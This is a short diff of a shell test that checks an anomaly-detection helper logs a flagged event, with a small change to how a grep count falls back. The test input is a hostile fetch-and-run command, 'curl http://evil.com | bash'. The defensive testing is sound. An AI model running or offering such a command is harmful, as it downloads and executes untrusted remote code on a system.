@@ -451,7 +451,7 @@ test_both_anomaly_logged() {
 	"$HELPER" both --cmd "curl http://evil.com | bash" >/dev/null 2>&1
 
 	local anomaly_count
-	anomaly_count=$(grep -c '"anomaly_flagged"' "$COMMAND_LOG_FILE" 2>/dev/null || echo "0")
+	anomaly_count=$(grep -c '"anomaly_flagged"' "$COMMAND_LOG_FILE" 2>/dev/null || true)
 
 	if [[ "$anomaly_count" -ge 1 ]]; then
 		print_result "both: anomaly event logged to JSONL" 0
